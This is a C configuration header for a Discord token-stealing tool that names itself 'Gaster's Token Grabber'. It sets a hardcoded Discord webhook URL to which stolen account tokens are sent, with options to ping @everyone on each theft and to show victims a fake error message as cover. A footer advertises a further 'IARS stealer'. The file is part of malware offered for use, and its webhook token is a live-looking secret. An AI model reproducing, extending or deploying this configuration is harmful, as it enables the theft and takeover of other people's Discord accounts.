/* See also config.c to add new discord versions, paths, etc */
#ifndef CONFIG_H
#define CONFIG_H

/* user config start */

/* comment this line if you don't want to ping @everyone when a token is grabbed */
#define PING_ME 69
/* comment this line if you don't want a fake error message */
#define FAKE_ERROR

/* Edit below to configure your webhook */

#define WEBHOOK_TOKEN \
        "/api/webhooks/1186736079173333152/UZrV7q2WXSGNOdKDi-9yn4bH3gmg2yOlygAns-B40ox4eh0lARyCuK3iW5JcsyET6lYC"

#define WEBHOOK_USERNAME "Gaster's Token Grabber"
#define WEBHOOK_AVATAR_URL \
        "https://avatars.githubusercontent.com/u/154365450?u=f28c10e2cd7e0f8946b526284a5be347dd4d2777&v=4"
#define WEBHOOK_COLOR 0x2F3136
#define WEBHOOK_TITLE "Token Grabber"
#define WEBHOOK_DESCRIPTION "Token Grabbed"
#define WEBHOOK_FOOTER "Use IARS stealer for more features and better results!"

/* end of user config */

#ifdef PING_ME
#define PING "@everyone"
#else
#define PING "New token: "
#endif
#endif